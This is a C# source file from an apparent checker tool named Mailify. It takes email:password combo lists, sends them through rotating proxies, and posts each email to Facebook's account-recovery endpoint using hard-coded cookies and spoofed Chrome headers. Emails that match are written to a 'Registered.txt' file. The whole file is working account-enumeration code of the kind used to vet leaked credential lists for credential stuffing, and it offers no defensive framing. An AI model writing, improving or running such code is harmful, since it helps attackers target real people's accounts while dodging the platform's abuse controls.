using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class Facebook_VM
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;


            new Thread(() => Variables.VM_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();
            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

             
                    req.AddHeader("cookie", "sb=htdXYLp8jWSsBb0-zg6sagLp; fr=1nuiFEU9nwEXkIAGW..BgV9eG.BS.GBc.0.0.BgYiVQ.AWUgr1-0UOs; datr=UCViYFqrAWphPUQzeyIwNhp4; wd=539x619; dpr=1.5");
                    req.AddHeader("origin", "https://www.facebook.com");
                    req.AddHeader("referer", "https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0");
                    req.AddHeader("sec-ch-ua", "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"");
                    req.AddHeader("sec-ch-ua-mobile", "?0");
                    req.AddHeader("sec-fetch-dest", "empty");
                    req.AddHeader("sec-fetch-mode", "cors");
                    req.AddHeader("sec-fetch-site", "same-origin");
                    req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36");
                    req.AddHeader("x-fb-lsd", "AVoWmENFejc");

                    var res0 = req.Post("https://www.facebook.com/ajax/login/help/identify.php?ctx=recover", "jazoest=2981&lsd=AVoWmENFejc&email=" +credentials[0] + "&did_submit=1&__user=0&__a=1&__dyn=7xe6Fo4OQ1PyWwHBWo5O12wAxu13wqovzEdEc8uxa0z8S2S4o720SUhwem0nCq1ewcG0KEswaq0woy1Qw5MKdwl8G0DE7e2l0FG7o4y0Mo5W3S1lwlEbE28xe3C0D85a2W2K0zE5W0vS&__csr=&__req=6&__beoa=0&__pc=PHASED%3ADEFAULT&__bhv=2&dpr=1.5&__ccg=GOOD&__rev=1003530268&__s=ksxvdr%3Anjowmp%3A4rbqpl&__hsi=6945154635513826993-0&__comet_req=0&__spin_r=1003530268&__spin_b=trunk&__spin_t=1617044824", "application/x-www-form-urlencoded");
                    string text0 = res0.ToString();

                    if (text0.Contains("recover\\\\\\/initiate"))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            if (Config.kekr_UI == "LOG")
                            {
                                Console.WriteLine($"[+] {combo}", Color.Green);
                            }
                            File.AppendAllText(Variables.results + "Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else if (text0.Contains("No Search Results"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Not Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }
                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}